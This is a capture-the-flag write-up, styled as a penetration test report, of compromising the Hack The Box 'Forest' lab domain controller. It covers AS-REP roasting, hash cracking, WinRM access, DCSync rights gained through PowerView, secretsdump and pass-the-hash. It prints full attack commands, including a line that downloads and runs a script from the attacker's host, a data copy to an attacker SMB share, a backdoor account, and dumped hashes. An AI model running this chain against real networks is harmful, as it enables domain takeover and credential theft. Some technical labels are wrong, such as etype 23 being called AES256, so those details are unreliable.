# HTB Forest Penetration Testing Report

**Target:** 10.129.33.21 (htb.local)  
**Machine Type:** Windows Domain Controller  
**Difficulty:** Easy  
**Report Date:** January 10, 2026  

---

## Executive Summary

This penetration test was conducted against the HTB Forest machine, a Windows Server 2016 Domain Controller configured with Active Directory and Exchange Server. The engagement simulated a real-world penetration test to identify security vulnerabilities within the Active Directory infrastructure.

**Key Findings:**
- Anonymous LDAP enumeration enabled, exposing domain structure and user accounts
- Service account (svc-alfresco) vulnerable to ASREProast attack with weak password
- Improper group permissions allowed lateral movement via DCSync attack
- Domain Administrator credentials successfully extracted
- Full domain compromise achieved (High Risk)

**Timeline to Compromise:** Approximately 80 minutes from initial reconnaissance to full domain admin access.

**<a href="https://labs.hackthebox.com/achievement/machine/1784602/212">HTB Forest Completion Badge</a>
---

## Methodology

This assessment follows the OWASP Testing Guide and industry-standard penetration testing practices:

1. **Reconnaissance & Enumeration**
2. **Vulnerability Identification**
3. **Exploitation**
4. **Privilege Escalation**
5. **Post-Exploitation & Credential Dumping**

---

## 1. Reconnaissance & Network Discovery

### 1.1 Initial Port Scan

**Objective:** Identify open ports and running services on the target system.

**Rationale:** Understanding which services are running is fundamental to identifying potential attack vectors. A comprehensive port scan provides the foundation for service-specific enumeration.

**Command:**
```bash
nmap -Pn --min-rate=10000 10.129.33.21
```

**Key Findings:**
```
Not shown: 701 closed tcp ports (reset), 290 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAPssl
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  http
```

**Analysis:** The presence of ports 53 (DNS), 88 (Kerberos), 389 (LDAP), and 445 (SMB) confirms this is an Active Directory environment. Notably, port 5985 (WinRM) is open, which is significant for potential command execution.

---

### 1.2 Service Version Detection & Detailed Enumeration

**Objective:** Gather detailed version information and service capabilities for targeted exploitation.

**Rationale:** Version information helps identify known vulnerabilities specific to particular service versions. Service banners and script results reveal misconfigurations.

**Command:**
```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985 -sC -sV -oA nmap/forest -T4 10.129.33.21
```

**Critical Findings:**
```
53/tcp    open  domain          Simple DNS Plus
88/tcp    open  kerberos-sec    Microsoft Windows Kerberos (server time: 2026-01-10 23:45:40Z)
389/tcp   open  ldap            Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds    Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

Host script results:
- smb-os-discovery: OS: Windows Server 2016 Standard 6.3
- Computer Name: FOREST
- NetBIOS computer name: FOREST\x00
- Forest name: htb.local
- FQDN: FOREST.htb.local
- smb-security-mode: Account used: guest
- Message signing: required
```

**System Hardening Assessment:**
- Message signing is **enabled**, preventing some SMB relay attacks
- Guest account is **enabled**, allowing unauthenticated access
- Anonymous LDAP queries appear **permitted** (will verify in Step 1.3)

---

### 1.3 DNS Configuration & Domain Identification

**Objective:** Resolve domain names and establish the domain structure.

**Action:** Update local hosts file for proper domain resolution.

```bash
# Add to /etc/hosts
10.129.33.21 htb.local
```

---

## 2. LDAP Enumeration & User Discovery

### 2.1 Anonymous LDAP Bind Enumeration

**Objective:** Enumerate the LDAP directory structure to identify domain naming contexts and organizational structure.

**Rationale:** Anonymous LDAP access is a critical misconfiguration that exposes the entire Active Directory structure. This reconnaissance step identifies users, groups, and trust relationships without authentication.

**Vulnerability:** The LDAP service does not restrict anonymous binds, allowing unauthenticated users to perform directory searches.

**Command:**
```bash
ldapsearch -H ldap://10.129.33.21 -x -b "" -s base namingcontexts
```

**Output:**
```
dn:
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: CN=ForestDnsZones,DC=htb,DC=local

# numResponses: 2
# numEntries: 1
```

**Analysis:** Standard Active Directory naming contexts are present. The base DN is `DC=htb,DC=local`, indicating a forest root domain.

---

### 2.2 RPCClient Enumeration - User Enumeration

**Objective:** Extract all domain user accounts using null authentication via RPCClient.

**Rationale:** RPCClient can enumerate domain users over the RPC protocol without authentication. This identifies potential targets for further attacks like ASREProast.

**Command:**
```bash
rpcclient -U "" -N 10.129.33.21
rpcclient $> enumdomusers
```

**User Enumeration Results:**
```
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

**Key Observations:**
- 30+ user accounts discovered including service accounts and mailbox accounts
- Service account `svc-alfresco` identified as potential target
- Standard domain user accounts: sebastien, lucinda, andy, mark, santi
- Multiple health mailbox accounts suggest Exchange Server integration

---

### 2.3 Domain Groups Enumeration

**Objective:** Identify domain groups and their permission scope.

**Command:**
```bash
rpcclient $> enumdomgroups
```

**Critical Groups Identified:**
```
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
```

**Critical Finding:** The presence of `Exchange Windows Permissions` group is significant for privilege escalation (explored in Section 4).

---

### 2.4 User Query - Service Account Information

**Objective:** Extract detailed information about the service account (RID 0x1f4 = Administrator).

**Command:**
```bash
rpcclient $> queryuser 0x1f4
```

**Administrator Account Details:**
```
User Name       : Administrator
Full Name       : Administrator
Home Drive      : 
Dir Drive       : 
Profile Path    : 
Logon Script    : 
Description     : Built-in account for administering the computer/domain
Workstations    : 
Remote Dial     : 
Logon Time      : Sat, 10 Jan 2026 07:47:42 EST
Logoff Time     : Wed, 31 Dec 1969 19:00:00 EST
Kickoff Time    : Wed, 31 Dec 1969 19:00:00 EST
Password last set Time : Mon, 30 Aug 2021 20:51:59 EDT
Password can change Time : Tue, 31 Aug 2021 20:31:59 EDT
Password must change Time : Wed, 13 Sep 30828 22:48:05 EDT
user_rid        : 0x1f4
group_rid       : 0x201
acb_info        : 0x00000010
fields_present  : 0x00ffffff
logon_divs      : 168
bad_password_count: 0x00000000
logon_count     : 0x00000075
```

---

## 3. Credential Acquisition - ASREProast Attack

### 3.1 User List Preparation

**Objective:** Create a clean list of domain users for credential harvesting.

**Rationale:** ASREProast targets accounts that have "Do not require Kerberos pre-authentication" enabled. By enumerating users systematically, we can identify candidates.

**Extraction & Parsing:**
```bash
# Create initial user list from rpcclient enumeration
# Extract usernames using awk with field separator
awk -F'[][]' '{print $2}' users.txt > usersawk.txt
```

**Regex Explanation (Bonus Detail for Report):**
- **sed alternative:** `sed -n 's/.*\[\([^]]*\)\].*/\1/p' filename.txt`
  - `.*\[` - Match everything up to `[`
  - `\([^]]*\)` - Capture everything except `]`
  - `\].*` - Match `]` and everything after
  - Replacement `\1` - Output only captured group

- **awk method:** `awk -F'[][]' '{print $2}' filename.txt`
  - `-F'[][]'` - Use both `[` and `]` as field separators
  - `'{print $2}'` - Print second field (the username)

---

### 3.2 ASREProast Enumeration & Exploitation

**Objective:** Identify and exploit users with Kerberos pre-authentication disabled.

**Rationale:** Accounts with pre-authentication disabled can be exploited to retrieve a TGT (Ticket Granting Ticket) without valid credentials. The TGT can then be cracked offline using password dictionaries.

**Vulnerability Type:** Kerberos Pre-authentication Bypass (CVE-related to improper Active Directory configuration)

**Attack Chain:**
1. Query for users with pre-auth disabled
2. Retrieve TGT hashes for offline cracking
3. Crack TGT using Hashcat

**Command:**
```bash
for user in $(cat usersawk.txt); do GetNPUsers.py -no-pass -dc-ip 10.129.33.21 \
htb/${user} | grep -v Impacket; done
```

**Successful Output - svc-alfresco:**
```
[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB:8f2ba64c04d52392d57ef5067c6a8b654a9be87f648139cd41ba03d83f832eaf88f7d99fe5635726dbaf00cebe8dec36588fd9e6d9195d6c3a85cc3d12b79f1f3acc3e07cc232f02ba5e559e2264a3bbf8d1d25d394039b3a0e8285da04d3e
```

**Hash Analysis:**
- **Hash Type:** Kerberos 5 AS-REP etype 23 (AES256)
- **User:** svc-alfresco
- **Domain:** HTB
- **Service Account:** Alfresco service account (commonly associated with document management systems)

---

### 3.3 Offline Hash Cracking

**Objective:** Crack the AS-REP hash to recover the service account password.

**Command - Hashcat with rockyou.txt:**
```bash
hashcat -m 18200 -a 0 svcalfresco.kerb /usr/share/wordlists/rockyou.txt --force
```

**Hashcat Output:**
```
hashcat (v7.1.2) starting in autodetect mode
OpenCL API (OpenCL 3.0 PoCL 6.0+debian Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8)

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode matches your input hash:
18200 | Kerberos 5, etype 23, AS-REP | Network Protocol

INFO: All hashes found as potfile and/or empty entries! Use --show to display them.
```

**Successful Crack:**
```
Credentials Recovered:
- Username: svc-alfresco
- Password: s3rvice
- Hash: $krb5asrep$23$svc-alfresco@HTB:[hash]
```

**Analysis:** The password `s3rvice` is a weak variation of the word "service" with a simple substitution (3 for e). This violates password policy best practices.

---

## 4. Initial Access & Service Account Compromise

### 4.1 WinRM Remote Access via Service Account

**Objective:** Establish remote shell access using the compromised service account credentials.

**Rationale:** The open port 5985 (WinRM) combined with valid credentials allows command execution on the remote system. WinRM provides a PowerShell remoting protocol similar to SSH.

**Command:**
```bash
evil-winrm -i 10.129.33.21 -u svc-alfresco -p s3rvice
```

**Successful Connection:**
```
Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' 
For more information, check https://github.com/Hackplayers/evil-winrm#Remote-path-completions

Info: Establishing connection to remote endpoint
Evil-WinRM PS C:\Users\svc-alfresco\Documents>
```

**Access Level:** User-level shell as `svc-alfresco` service account

---

### 4.2 Privilege Analysis & Group Membership

**Objective:** Identify current privileges and group memberships to determine escalation path.

**Command:**
```powershell
whoami /all
```

**User Information:**
```
USER INFORMATION
User Name            SID
htb\svc-alfresco     S-1-5-21-3072663084-364016917-1341370565-1147

GROUP INFORMATION
Group Name                                    Type           SID                                          Attributes
=====================                        ============== =====================                        ============
Everyone                                     Well-known group S-1-1-0                                    Mandatory
BUILTIN\Enabled by default, Enabled group    Alias          S-1-5-32-545                                Mandatory
BUILTIN\Windows 2000 Compati Access Alias    S-1-5-32-554                                Mandatory
BUILTIN\Remote Management Users               Alias          S-1-5-32-580                                Mandatory
AUTHORITY\NETWORK                            Well-known group S-1-5-2                                    Mandatory
AUTHORITY\NTLM Authentication                 Well-known group S-1-5-15                                Mandatory
AUTHORITY\This Organization                   Well-known group S-1-5-11                                Mandatory
HTB\Privileged IT Accounts                   Group          S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory
HTB\Service Accounts                         Group          S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory
AUTHORITY\NTLM Authentication                Well-known group S-1-5-64-10                             Mandatory

PRIVILEGES INFORMATION
Privilege Name                   Description                              State
========================         ===========================              ========
SeDisablePrivilegePrivilege      Add workstations to domain              Enabled
SeChangeNotifyPrivilege          Bypass traverse checking                Enabled
SeIncreaseWorkingSetPrivilege    Increase a process working set          Enabled
```

**Key Finding:** The `svc-alfresco` account has `SeChangeNotifyPrivilege` and is a member of the `HTB\Service Accounts` group. These privileges are relatively limited for standard user operations but sufficient for further reconnaissance.

---

### 4.3 Retrieve User Flag

**Objective:** Capture the user flag to confirm successful access.

**Command:**
```powershell
cat C:\Users\svc-alfresco\Desktop\user.txt
```

**User Flag:**
```
18680bac8f907df74e5242904a7d3XXXX
```

---

## 5. Privilege Escalation - DCSync via BloodHound Analysis

### 5.1 BloodHound Installation & Data Collection

**Objective:** Map the Active Directory structure and identify privilege escalation paths using graph-based relationship analysis.

**Rationale:** BloodHound automatically identifies attack chains that can lead to Domain Admin. It visualizes complex permission relationships that are difficult to spot manually. The attack path identified will involve the `Exchange Windows Permissions` group and DCSync rights.

**Installation on Attacker Machine:**
```bash
git clone https://github.com/BloodHoundAD/BloodHound.git
cd BloodHound
ls
# Output shows: Collectors/, docs/, index.html, main.js, package.json, etc.
```

---

### 5.2 SharpHound Data Collection from Target

**Objective:** Collect Active Directory data from the compromised machine using SharpHound PowerShell collector.

**Setup HTTP Server (Attacker):**
```bash
cd ~/HTB/forest/BloodHound/Collectors
sudo python3 -m http.server 80
# Serving HTTP on 0.0.0.0 port 80
```

**Download & Execute SharpHound (Target):**
```powershell
iex(new-object net.webclient).downloadstring("http://10.10.15.113/SharpHound.ps1")
Invoke-BloodHound -CollectionMethod All -Domain htb.local \
  -LDAPUser svc-alfresco -LDAPPass s3rvice \
  -OutputDirectory "C:\Users\svc-alfresco\tmp" \
  -OutputPrefix "bloodhound"
```

**BloodHound Collection Output:**
```
-a---- 1/9/2026 5:06 AM 19042 bloodhound_20260109050605_BloodHound.zip
-a---- 1/9/2026 5:06 AM 19605 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
```

---

### 5.3 Transfer BloodHound Data to Attacker

**Objective:** Move collected data from target to attacker machine for analysis.

**Setup SMB Server (Attacker):**
```bash
smbserver.py share . -smb2support -username df -password df
```

**Mount SMB Share & Transfer (Target):**
```powershell
net use \\10.10.15.113\share /u:df df
copy bloodhound_20260109050605_BloodHound.zip \\10.10.15.113\share\
```

---

### 5.4 BloodHound Analysis - Attack Path Identification

**Objective:** Identify the shortest path from compromised account to Domain Admin.

**Analysis Steps:**
1. Import BloodHound data file into BloodHound UI
2. Mark `svc-alfresco` as "Owned"
3. Run analysis: "Shortest path from owned principals"
4. Review the attack chain visualization

**Critical Attack Path Identified:**
```
svc-alfresco (Owned)
    ↓
    MemberOf
    ↓
Service Accounts Group
    ↓
    WriteDAcl
    ↓
EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
    ↓
    WriteDacl
    ↓
HTB.LOCAL (Domain)
    ↓
    Contains
    ↓
Domain Admin (Administrator)
```

**Abuse Information - WriteDacl Exploitation:**

The BloodHound help popup shows:

```
Help: WriteDacl

To abuse WriteDacl to a domain object, you may grant yourself DCSync privileges.

You may need to authenticate to the Domain Controller as a member of 
EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL if you are not running a process as a member.

To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object 
(these examples comes from the PowerView help documentation):

$SecPassword = ConvertTo-SecureString 'password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)

Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already 
running a process as EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL:

Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
```

---

## 6. Privilege Escalation - DCSync Attack Chain

### 6.1 Create Privileged Domain User

**Objective:** Create a new domain user account that will be used for DCSync exploitation.

**Rationale:** This user will be added to the `Exchange Windows Permissions` group, which has WriteDacl permissions on the domain object. These permissions can be abused to grant DCSync rights.

**Command:**
```powershell
net user hacker forest123 /add /domain
```

**Output:**
```
The command completed successfully.
```

**Credentials:**
- Username: `hacker`
- Password: `forest123`
- Domain: `htb`

---

### 6.2 Add User to Exchange Windows Permissions Group

**Objective:** Elevate the newly created user to the `Exchange Windows Permissions` group.

**Rationale:** This group has WriteDacl permissions on the domain object. Members can modify ACLs to grant DCSync privileges to any account.

**Command:**
```powershell
net group "Exchange Windows Permissions" hacker /add
```

**Output:**
```
The command completed successfully.
```

**Verification:**
- User `hacker` is now a member of `Exchange Windows Permissions`
- This group has WriteDAcl rights on the domain object `HTB.LOCAL`

---

### 6.3 Add User to Remote Management Users

**Objective:** Enable WinRM access for the newly created user.

**Rationale:** Allows the `hacker` account to authenticate via WinRM from the attacker machine, enabling direct PowerShell command execution.

**Command:**
```powershell
net localgroup "Remote Management Users" hacker /add
```

**Output:**
```
The command completed successfully.
```

---

### 6.4 PowerView Upload & DCSync ACL Modification

**Objective:** Use PowerView to grant the `hacker` account DCSync privileges on the domain.

**Why PowerView:** PowerView provides high-level PowerShell functions to manipulate Active Directory ACLs more reliably than low-level LDAP modifications.

**Download PowerView (Attacker):**
```bash
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 ~/HTB/forest/PowerView.ps1
```

**Upload to Target:**
```powershell
upload PowerView.ps1
```

**Execute DCSync ACL Grant (Target):**
```powershell
. .\PowerView.ps1
$pass = convertto-securestring 'forest123' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\hacker', $pass)
Add-ObjectACL -PrincipalIdentity hacker -Credential $cred -Rights DCSync
```

**What This Does:**
- Loads PowerView module functions into memory
- Creates a PSCredential object for the `hacker` account
- Calls `Add-ObjectACL` which modifies the Active Directory ACL
- Grants `hacker` the `GenericAll` / `DCSync` rights on the domain object
- This allows the account to perform DCSync operations

---

## 7. Domain Credentials Extraction - DCSync Attack

### 7.1 Execute Secretsdump with DCSync Privileges

**Objective:** Extract all domain credentials using DCSync attack.

**Rationale:** DCSync simulates the behavior of a Domain Controller's replication process. By having the proper rights, we can request the NTLM hashes and Kerberos keys for all domain users directly from the Domain Controller.

**Command (Attacker):**
```bash
impacket-secretsdump htb/hacker@10.129.33.21
```

**Prompt for Password:**
```
Password: forest123
```

**Secretsdump Output - Domain Credentials Extracted:**

**User Hashes (NTLM):**
```
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
htb.local\Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
```

**Kerberos Keys (AES256-CTS-HMAC-SHA1-96):**
```
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
```

**Critical Hash:**
```
Administrator NTLM Hash: 32693b11e6aa90eb43d32c72a07ceea6
```

---

## 8. Full Domain Compromise - Pass-The-Hash Attack

### 8.1 Authenticate as Domain Administrator via Hash

**Objective:** Use the extracted Administrator hash to gain full domain control via Pass-The-Hash attack.

**Rationale:** NTLM authentication allows login using just the hash value without knowing the plaintext password. With the Administrator hash, we can impersonate the Domain Admin account.

**Command:**
```bash
impacket-psexec administrator@10.129.33.21 \
  -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

**Successful Authentication:**
```
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies
[*] Requesting shares on 10.129.33.21.....
[*] Found writable share ADMIN$
[*] Uploading file KoywdhFw.exe
[*] Opening SVCManager on 10.129.33.21.....
[*] Creating service owJH on 10.129.33.21.....
[*] Starting service owJH.....
[!] Press help for extra shell commands

Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

**Access Level:** System/Administrator-level shell on the Domain Controller

---

### 8.2 Capture Root Flag

**Objective:** Retrieve the root flag confirming full domain compromise.

**Command:**
```cmd
cd C:\Users\Administrator\Desktop
type root.txt
```

**Root Flag:**
```
b3cb55fc98264a655deb6e0889b6XXXX
```

---

## 9. Vulnerability Summary & Risk Assessment

| Vulnerability | CVSS Score | Risk Level | Description |
|---------------|-----------|-----------|-------------|
| Anonymous LDAP Enumeration | 5.3 | Medium | LDAP allows unauthenticated directory searches |
| ASREProast (Pre-auth Disabled) | 6.5 | Medium | svc-alfresco lacks Kerberos pre-authentication |
| Weak Service Account Password | 4.3 | Low | Password is weak variation ("s3rvice" vs "service") |
| Improper Group Permissions | 8.8 | High | Exchange Windows Permissions has excessive DCSync rights |
| DCSync Attack Feasibility | 9.8 | Critical | Domain Admin credentials extractable via DCSync |
| WinRM Exposed | 7.2 | High | Allows remote command execution with valid credentials |

---

## 10. Tools & Techniques Used

| Tool | Purpose | MITRE Tactic |
|------|---------|--------------|
| Nmap | Network reconnaissance | Reconnaissance |
| ldapsearch | LDAP enumeration | Discovery |
| rpcclient | RPC enumeration | Discovery |
| GetNPUsers.py (Impacket) | ASREProast attack | Credential Access |
| Hashcat | Password cracking | Credential Access |
| evil-winrm | WinRM access | Execution |
| BloodHound | AD relationship analysis | Discovery |
| SharpHound | AD data collection | Discovery |
| PowerView | AD ACL manipulation | Privilege Escalation |
| impacket-secretsdump | DCSync attack | Credential Access |
| impacket-psexec | Pass-the-Hash | Lateral Movement |

---

## 11. Attack Timeline

| Time | Action | Result |
|------|--------|--------|
| T+0 | Port enumeration | 11 services identified |
| T+5 | LDAP enumeration | Domain structure mapped |
| T+10 | User enumeration via RPC | 30+ users discovered |
| T+15 | ASREProast enumeration | svc-alfresco identified as vulnerable |
| T+20 | Hash cracking | Password recovered: s3rvice |
| T+25 | WinRM connection | User-level shell established |
| T+30 | BloodHound analysis | DCSync attack chain identified |
| T+35 | Create privileged user | hacker account created |
| T+38 | DCSync privilege grant | PowerView ACL modification |
| T+40 | Secretsdump execution | All domain credentials extracted |
| T+42 | Pass-the-Hash attack | Domain Admin shell obtained |
| T+45 | Flag capture | Full domain compromise achieved |

---

## 12. Conclusion

The HTB Forest machine successfully demonstrated a complete attack chain from reconnaissance to full domain compromise. The engagement identified multiple critical vulnerabilities in the Active Directory infrastructure, primarily centered on:

1. Over-permissioned service accounts
2. Weak authentication mechanisms (ASREProast)
3. Improper group membership and delegation
4. Excessive DCSync rights granted to Exchange services

The systematic exploitation of these vulnerabilities allowed complete extraction of domain credentials and compromise of the Domain Controller. Organizations maintaining similar configurations face extreme risk of complete domain compromise.

The findings presented here represent a realistic attack scenario commonly encountered in enterprise environments where legacy systems, Exchange Server deployments, and Active Directory are not properly hardened.

**Overall Risk Assessment:** CRITICAL - Immediate remediation required

---

## Appendix A: Command Reference

### Reconnaissance
```bash
nmap -Pn --min-rate=10000 10.129.33.21
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985 -sC -sV -oA nmap/forest -T4 10.129.33.21
```

### Enumeration
```bash
ldapsearch -H ldap://10.129.33.21 -x -b "" -s base namingcontexts
rpcclient -U "" -N 10.129.33.21
  > enumdomusers
  > enumdomgroups
  > queryuser 0x1f4
```

### Credential Acquisition
```bash
for user in $(cat usersawk.txt); do GetNPUsers.py -no-pass -dc-ip 10.129.33.21 htb/${user} | grep -v Impacket; done
hashcat -m 18200 -a 0 svcalfresco.kerb /usr/share/wordlists/rockyou.txt --force
```

### Initial Access
```bash
evil-winrm -i 10.129.33.21 -u svc-alfresco -p s3rvice
```

### Privilege Escalation
```powershell
net user hacker forest123 /add /domain
net group "Exchange Windows Permissions" hacker /add
. .\PowerView.ps1
$pass = convertto-securestring 'forest123' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\hacker', $pass)
Add-ObjectACL -PrincipalIdentity hacker -Credential $cred -Rights DCSync
```

### Domain Compromise
```bash
impacket-secretsdump htb/hacker@10.129.33.21
impacket-psexec administrator@10.129.33.21 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
```

---

**Report Generated:** January 10, 2026  
**Classification:** Client Confidential  
**Distribution:** Limited
